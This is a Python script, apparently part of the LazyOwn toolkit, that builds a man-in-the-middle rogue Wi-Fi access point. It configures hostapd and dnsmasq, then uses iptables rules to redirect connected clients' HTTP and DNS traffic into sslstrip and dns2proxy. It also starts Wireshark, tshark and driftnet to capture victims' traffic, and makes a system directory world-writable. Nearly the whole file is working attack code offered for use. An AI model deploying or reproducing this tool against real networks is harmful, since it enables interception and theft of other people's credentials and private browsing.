# coding=utf-8

import os
import time
import subprocess
import argparse
import signal
import sys

header = """
888                                  .d88888b.                         
888                                 d88P" "Y88b                        
888                                 888     888                        
888       8888b.  88888888 888  888 888     888 888  888  888 88888b.  
888          "88b    d88P  888  888 888     888 888  888  888 888 "88b 
888      .d888888   d88P   888  888 888     888 888  888  888 888  888 
888      888  888  d88P    Y88b 888 Y88b. .d88P Y88b 888 d88P 888  888 
88888888 "Y888888 88888888  "Y88888  "Y88888P"   "Y8888888P"  888  888 
888b     d888 d8b 888           888                d8888 8888888b.     
8888b   d8888 Y8P 888      Y8b d88P               d88888 888   Y88b    
88888b.d88888     888       "Y88P"               d88P888 888    888    
888Y88888P888 888 888888 88888b.d88b.           d88P 888 888   d88P    
888 Y888P 888 888 888    888 "888 "88b         d88P  888 8888888P"     
888  Y8P  888 888 888    888  888  888        d88P   888 888           
888   "   888 888 Y88b.  888  888  888       d8888888888 888           
888       888 888  "Y888 888  888  888      d88P     888 888           
"""


def print_header():
    print(header + "             by grisUNO \n")


def run_cmd_write(cmd_args, s):
    """Write a file using sudo."""
    p = subprocess.Popen(
        cmd_args,
        stdin=subprocess.PIPE,
        stdout=subprocess.DEVNULL,
        shell=False,
        universal_newlines=True,
    )
    p.stdin.write(s)
    p.stdin.close()
    p.wait()


def write_file(path, s):
    run_cmd_write(["sudo", "tee", path], s)


def append_file(path, s):
    """Append to the file, don't overwrite."""
    run_cmd_write(["sudo", "tee", "-a", path], s)


def create_dir(directory):
    """Create directory with sudo if it does not exist."""
    os.system(f"sudo mkdir -p {directory} > /dev/null 2>&1")


def set_permissions(directory, permissions="777"):
    """Set directory permissions with sudo."""
    os.system(f"sudo chmod {permissions} {directory}")


def install_dependencies():
    """Install required dependencies."""
    dependencies = [
        "dnsmasq",
        "wireshark",
        "hostapd",
        "screen",
        "wondershaper",
        "driftnet",
        "python3-pip",
        "python3-dev",
        "libffi-dev",
        "libssl-dev",
        "libxml2-dev",
        "libxslt1-dev",
        "libjpeg62-turbo-dev",
        "zlib1g-dev",
        "libpcap-dev",
    ]
    os.system("sudo apt-get update")
    for dep in dependencies:
        os.system(f"sudo apt-get install {dep} -y")
    os.system("sudo python3 -m pip install mitmproxy")
    os.system("sudo python3 -m pip install dnspython pcapy twisted")


def backup_file(filepath):
    """Backup a given file."""
    os.system(f"sudo cp {filepath} {filepath}.backup")


def restore_file(filepath):
    """Restore a backed-up file."""
    if os.path.isfile(f"{filepath}.backup"):
        os.system(f"sudo mv {filepath}.backup {filepath}")
    else:
        os.system(f"sudo rm {filepath}")


def restart_service(service):
    """Restart a given service."""
    os.system(f"sudo service {service} restart")


def flush_iptables():
    """Flush iptables rules."""
    os.system("sudo iptables --flush")
    os.system("sudo iptables --table nat --flush")
    os.system("sudo iptables --delete-chain")
    os.system("sudo iptables --table nat --delete-chain")


def setup_network_manager(ap_iface):
    """Setup NetworkManager configuration for the AP interface."""
    network_manager_cfg = f"[main]\nplugins=keyfile\n\n[keyfile]\nunmanaged-devices=interface-name:{ap_iface}\n"
    backup_file("/etc/NetworkManager/NetworkManager.conf")
    write_file("/etc/NetworkManager/NetworkManager.conf", network_manager_cfg)
    restart_service("network-manager")
    os.system(f"sudo ifconfig {ap_iface} up")


def configure_dnsmasq(
    ap_iface,
    ap_ip_range_start,
    ap_ip_range_end,
    ap_ip_gateway,
    dns_ip_1,
    dns_ip_2,
    sslstrip,
):
    """Configure dnsmasq based on SSLSTRIP usage."""
    backup_file("/etc/dnsmasq.conf")
    if sslstrip:
        dnsmasq_file = (
            "port=0\n"
            "no-resolv\n"
            f"interface={ap_iface}\n"
            f"dhcp-range={ap_ip_range_start},{ap_ip_range_end},12h\n"
            f"dhcp-option=3,{ap_ip_gateway}\n"
            f"dhcp-option=6,{dns_ip_1},{dns_ip_2}\n"
        )
    else:
        dnsmasq_file = (
            "no-resolv\n"
            f"interface={ap_iface}\n"
            f"dhcp-range={ap_ip_range_start},{ap_ip_range_end},12h\n"
            f"server={dns_ip_1}\n"
            f"server={dns_ip_2}\n"
        )
    os.system("sudo rm /etc/dnsmasq.conf > /dev/null 2>&1")
    write_file("/etc/dnsmasq.conf", dnsmasq_file)


def configure_hostapd(ap_iface, ssid, channel, wpa_passphrase=None):
    """Configure hostapd based on user input."""
    if wpa_passphrase:
        hostapd_file = (
            f"interface={ap_iface}\n"
            "driver=nl80211\n"
            f"ssid={ssid}\n"
            "hw_mode=g\n"
            f"channel={channel}\n"
            "macaddr_acl=0\n"
            "auth_algs=1\n"
            "ignore_broadcast_ssid=0\n"
            "wpa=2\n"
            f"wpa_passphrase={wpa_passphrase}\n"
            "wpa_key_mgmt=WPA-PSK\n"
            "wpa_pairwise=TKIP\n"
            "rsn_pairwise=CCMP\n"
        )
    else:
        hostapd_file = (
            f"interface={ap_iface}\n"
            "driver=nl80211\n"
            f"ssid={ssid}\n"
            "hw_mode=g\n"
            f"channel={channel}\n"
            "macaddr_acl=0\n"
            "auth_algs=1\n"
            "ignore_broadcast_ssid=0\n"
        )
    os.system("sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1")
    write_file("/etc/hostapd/hostapd.conf", hostapd_file)


def setup_iptables(ap_iface, ap_ip, net_iface):
    """Setup iptables rules."""
    os.system(f"sudo ifconfig {ap_iface} up {ap_ip} netmask 255.255.255.0")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --table nat --flush")
    os.system("sudo iptables --delete-chain")
    os.system("sudo iptables --table nat --delete-chain")
    os.system(
        f"sudo iptables --table nat --append POSTROUTING --out-interface {net_iface} -j MASQUERADE"
    )
    os.system(f"sudo iptables --append FORWARD --in-interface {ap_iface} -j ACCEPT")


def set_speed_limit(ap_iface, speed_up, speed_down):
    """Set speed limit for the clients."""
    os.system(f"sudo wondershaper {ap_iface} {speed_up} {speed_down}")


def start_services(ap_iface, script_path, sslstrip, wireshark, driftnet, tshark):
    """Start necessary services based on user input."""
    if sslstrip:
        os.system(
            "sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000"
        )
        os.system(
            "sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53"
        )
        os.system(
            "sudo iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 53"
        )
        os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
        os.system(
            f"sudo screen -S mitmap-sslstrip -m -d python {script_path}/src/sslstrip2/sslstrip.py -l 9000 -w {script_path}/logs/mitmap-sslstrip.log -a"
        )
        os.system(
            f"sudo screen -S mitmap-dns2proxy -m -d sh -c 'cd {script_path}/src/dns2proxy && python dns2proxy.py'"
        )
    else:
        os.system(f"sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
        os.system(f"sudo screen -S mitmap-dnsmasq -m -d dnsmasq -C /etc/dnsmasq.conf")
    if wireshark:
        os.system(f"sudo screen -S mitmap-wireshark -m -d wireshark -i {ap_iface}")
    if driftnet:
        os.system(f"sudo screen -S mitmap-driftnet -m -d driftnet -i {ap_iface}")
    if tshark:
        os.system(f"sudo screen -S mitmap-tshark -m -d tshark -i {ap_iface}")


def cleanup():
    """Cleanup actions to restore system state."""
    restore_file("/etc/dnsmasq.conf")
    restore_file("/etc/hostapd/hostapd.conf")
    restore_file("/etc/NetworkManager/NetworkManager.conf")
    flush_iptables()
    restart_service("network-manager")


def signal_handler(sig, frame):
    print("Interrupt received, exiting...")
    cleanup()
    sys.exit(0)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LazyOwn MITM AP Attack Script")
    parser.add_argument(
        "--ap_iface", required=True, help="Interface to use for the Access Point"
    )
    parser.add_argument("--ssid", required=True, help="SSID for the Access Point")
    parser.add_argument("--channel", required=True, help="Channel for the Access Point")
    parser.add_argument(
        "--net_iface", required=True, help="Network Interface with Internet access"
    )
    parser.add_argument(
        "--ap_ip", required=True, help="IP Address for the Access Point"
    )
    parser.add_argument(
        "--ap_ip_range_start",
        required=True,
        help="DHCP range start IP for the Access Point",
    )
    parser.add_argument(
        "--ap_ip_range_end",
        required=True,
        help="DHCP range end IP for the Access Point",
    )
    parser.add_argument(
        "--ap_ip_gateway", required=True, help="Gateway IP for the Access Point"
    )
    parser.add_argument("--dns_ip_1", required=True, help="Primary DNS IP")
    parser.add_argument("--dns_ip_2", required=True, help="Secondary DNS IP")
    parser.add_argument(
        "--speed_up",
        required=False,
        default=1000,
        help="Upload speed limit for clients",
    )
    parser.add_argument(
        "--speed_down",
        required=False,
        default=1000,
        help="Download speed limit for clients",
    )
    parser.add_argument("--sslstrip", action="store_true", help="Enable SSLSTRIP")
    parser.add_argument("--wireshark", action="store_true", help="Enable Wireshark")
    parser.add_argument("--driftnet", action="store_true", help="Enable Driftnet")
    parser.add_argument("--tshark", action="store_true", help="Enable Tshark")
    parser.add_argument(
        "--wpa_passphrase", help="WPA Passphrase for the Access Point", default=None
    )
    print_header()
    args = parser.parse_args()

    signal.signal(signal.SIGINT, signal_handler)

    try:
        install_dependencies()
        create_dir("/var/lib/misc/dnsmasq")
        set_permissions("/var/lib/misc/dnsmasq", "777")

        setup_network_manager(args.ap_iface)
        configure_dnsmasq(
            args.ap_iface,
            args.ap_ip_range_start,
            args.ap_ip_range_end,
            args.ap_ip_gateway,
            args.dns_ip_1,
            args.dns_ip_2,
            args.sslstrip,
        )
        configure_hostapd(args.ap_iface, args.ssid, args.channel, args.wpa_passphrase)
        setup_iptables(args.ap_iface, args.ap_ip, args.net_iface)
        set_speed_limit(args.ap_iface, args.speed_up, args.speed_down)
        start_services(
            args.ap_iface,
            os.path.dirname(os.path.abspath(__file__)),
            args.sslstrip,
            args.wireshark,
            args.driftnet,
            args.tshark,
        )
        print("MITM AP setup complete.")

        while True:
            time.sleep(1)

    except Exception as e:
        print(f"An error occurred: {e}")
        cleanup()
        sys.exit(1)

    finally:
        cleanup()
